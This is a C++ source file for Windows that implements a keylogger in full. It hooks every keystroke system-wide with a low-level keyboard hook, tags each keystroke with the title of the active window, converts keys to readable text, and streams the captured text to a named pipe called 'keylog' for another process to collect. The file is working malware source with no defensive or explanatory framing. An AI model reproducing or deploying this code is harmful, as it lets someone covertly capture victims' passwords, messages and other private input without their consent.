#include <Windows.h>
#include <tchar.h>
#include <string>
#include <constant.h>

using namespace std;

#define MAX_BUFFER 192

class Implementation
{
	private:
		static HWND oldWindow;
		static int isCapsLock()
		{
			if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
				return 1;
			else
				return 0;
		}
		static LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
		{
			KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
			FILE *file;
			char val[5];
			DWORD dwMsg = 1;
			HANDLE keylogPipe  = CreateFile(TEXT("\\\\.\\pipe\\keylog"), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
			char buffer[MAX_BUFFER];
			DWORD written;
			strcpy(buffer, "");
			switch (wParam)
			{
			case WM_KEYDOWN: 
			{
		    HWND newWindow = GetForegroundWindow();
		    if(oldWindow == NULL || newWindow != oldWindow)
		    {
					char cWindow[MAX_PATH];
			    GetWindowTextA(GetForegroundWindow(), cWindow, sizeof(cWindow));
		    	strcat(buffer, "\nActive Window: ");
			    if (strcmp(cWindow, "") != 0)
			    {
		    		strcat(buffer, cWindow);
			    }
			    else
			    {
		    		strcat(buffer, "Desktop");
			    }
	    		strcat(buffer, "\n");
			    oldWindow = newWindow;
				}
				
				DWORD vkCode = pKeyBoard->vkCode;
				if ((vkCode >= 48) && (vkCode <= 57))
				{
					if (GetAsyncKeyState(VK_SHIFT))
					{
						switch (vkCode)
						{
						case 0x30:
	    				strcat(buffer, ")");
							break;
						case 0x31:
	    				strcat(buffer, "!");
							break;
						case 0x32:
	    				strcat(buffer, "@");
							break;
						case 0x33:
	    				strcat(buffer, "#");
							break;
						case 0x34:
	    				strcat(buffer, "$");
							break;
						case 0x35:
	    				strcat(buffer, "%");
							break;
						case 0x36:
	    				strcat(buffer, "^");
							break;
						case 0x37:
	    				strcat(buffer, "&");
							break;
						case 0x38:
	    				strcat(buffer, "*");
							break;
						case 0x39:
	    				strcat(buffer, "(");
							break;
						}
					}
					else
					{
						sprintf(val, "%c", vkCode);
	    			strcat(buffer, val);
					}
				}
				else if (vkCode >= 65 && vkCode <= 90)
				{
					if (!(GetAsyncKeyState(VK_SHIFT) ^ isCapsLock()))
					{
						vkCode += 32;
					}
					sprintf(val, "%c", vkCode);
	    		strcat(buffer, val);
				}
				else
				{
					switch (vkCode)
					{
					case VK_SPACE:
		    		strcat(buffer, " ");
						break;
					case VK_LCONTROL:
		    		strcat(buffer, "[Left Ctrl]");
						break;
					case VK_RCONTROL:
		    		strcat(buffer, "[Right Ctrl]");
						break;
					case VK_LMENU:
					case VK_RMENU:
		    		strcat(buffer, "[Alt]");
						break;
					case VK_INSERT:
		    		strcat(buffer, "[Insert]");
						break;
					case VK_DELETE:
		    		strcat(buffer, "[Del]");
						break;
					case VK_NUMPAD0:
		    		strcat(buffer, "0");
						break;
					case VK_NUMPAD1:
		    		strcat(buffer, "1");
						break;
					case VK_NUMPAD2:
		    		strcat(buffer, "2");
						break;
					case VK_NUMPAD3:
		    		strcat(buffer, "3");
						break;
					case VK_NUMPAD4:
		    		strcat(buffer, "4");
						break;
					case VK_NUMPAD5:
		    		strcat(buffer, "5");
						break;
					case VK_NUMPAD6:
		    		strcat(buffer, "6");
						break;
					case VK_NUMPAD7:
		    		strcat(buffer, "7");
						break;
					case VK_NUMPAD8:
		    		strcat(buffer, "8");
						break;
					case VK_NUMPAD9:
		    		strcat(buffer, "9");
						break;
					case VK_OEM_2:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "?");
		    		}
						else
						{
		    			strcat(buffer, "/");
		    		}
						break;
					case VK_OEM_3:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "~");
		    		}
						else
						{
		    			strcat(buffer, "`");
		    		}
						break;
					case VK_OEM_4:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "{");
		    		}
						else
						{
		    			strcat(buffer, "[");
		    		}
						break;
					case VK_OEM_5:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "|");
		    		}
						else
						{
		    			strcat(buffer, "\\");
		    		}
						break;
					case VK_OEM_6:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "}");
		    		}
						else
						{
		    			strcat(buffer, "]");
		    		}
						break;
					case VK_OEM_7:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "\"");
		    		}
						else
						{
		    			strcat(buffer, "'");
		    		}
						break;
					case VK_LSHIFT:
					case VK_RSHIFT:
						break;
					case 0xBC:   
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "<");
		    		}
						else
						{
		    			strcat(buffer, ",");
		    		}
						break;
					case 0xBE:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, ">");
		    		}
						else
						{
		    			strcat(buffer, ".");
		    		}
						break;
					case 0xBA:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, ":");
		    		}
						else
						{
		    			strcat(buffer, ";");
		    		}
						break;
					case 0xBD:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "_");
		    		}
						else
						{
		    			strcat(buffer, "-");
		    		}
						break;
					case 0xBB:
						if (GetAsyncKeyState(VK_SHIFT))
						{
		    			strcat(buffer, "+");
		    		}
						else
						{
		    			strcat(buffer, "=");
		    		}
						break;
					case VK_LWIN:
					  strcat(buffer, "[Left Windows]");
					  break;
					case VK_RWIN:
					  strcat(buffer, "[Right Windows]");
					  break;
					case VK_UP:
					  strcat(buffer, "[Up]");
					  break;
					case VK_LEFT:
					  strcat(buffer, "[Left]");
					  break;
					case VK_DOWN:
					  strcat(buffer, "[Down]");
					  break;
					case VK_RIGHT:
					  strcat(buffer, "[Right]");
					  break;
					default:
						dwMsg += pKeyBoard->scanCode << 16;
						dwMsg += pKeyBoard->flags << 24;
						char key[16];
						GetKeyNameText(dwMsg, key, 15);
						if (strcmp(key, "Enter") == 0)
							strcpy(key, "\n");
						else if (strcmp(key, "Backspace") == 0)
							strcpy(key, "[Backspace]");
						else if (strcmp(key, "Page Up") == 0)
							strcpy(key, "[Page Up]");
						else if (strcmp(key, "Page Down") == 0)
							strcpy(key, "[Page Down]");
						else if (strcmp(key, "Home") == 0)
							strcpy(key, "[Home]");
						else if (strcmp(key, "End") == 0)
							strcpy(key, "[End]");
						else if (strcmp(key, "Pause") == 0)
							strcpy(key, "[Pause]");
						else if (strcmp(key, "Esc") == 0)
							strcpy(key, "[Esc]");
						else if (strcmp(key, "Application") == 0)
							strcpy(key, "[Application]");
						if (strcmp(key, "Caps Lock") != 0)
		    			strcat(buffer, key);
					}
				}
			}
			default:
        WriteFile(keylogPipe, buffer, strlen(buffer) + 1, &written, NULL);
        CloseHandle(keylogPipe);
				return CallNextHookEx(NULL, nCode, wParam, lParam);
			}
      WriteFile(keylogPipe, buffer, strlen(buffer) + 1, &written, NULL);
      CloseHandle(keylogPipe);
			return 0;
		}
  public:
	  static DWORD log()
	  {
			HHOOK hKeyHook;
			HINSTANCE hExe = GetModuleHandle(NULL);
			if (hExe == NULL)
				return 1;
			else
			{
				hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
				if (hKeyHook == NULL)
				{
					return 1;
				}
				MSG msg;
				while (GetMessage(&msg, NULL, 0, 0) != 0)
				{
					TranslateMessage(&msg);
					DispatchMessage(&msg);
				}
				UnhookWindowsHookEx(hKeyHook);
			}
			return 0;
	  }
};

HWND Implementation::oldWindow = NULL;